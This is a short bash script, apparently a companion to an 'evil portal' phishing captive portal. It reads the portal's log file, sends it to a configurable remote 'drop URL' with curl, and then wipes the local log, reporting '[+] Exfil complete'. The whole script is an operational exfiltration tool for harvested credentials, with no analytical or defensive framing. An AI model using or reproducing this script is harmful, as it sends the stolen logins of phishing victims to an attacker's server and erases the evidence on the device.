#!/bin/bash
# Run this to ship logs off-device
# Set your drop URL below

DROP_URL="https://your-server.com/collect"
LOG_FILE="/tmp/evilportal.log"

if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
    curl -X POST -H "Content-Type: text/plain" \
         --data-binary @"$LOG_FILE" \
         "$DROP_URL" \
         -o /dev/null -s -w "%{http_code}"

    # Clear after successful exfil
    if [ $? -eq 0 ]; then
        > $LOG_FILE
        echo "[+] Exfil complete. Log cleared."
    fi
else
    echo "[-] No data to exfil."
fi
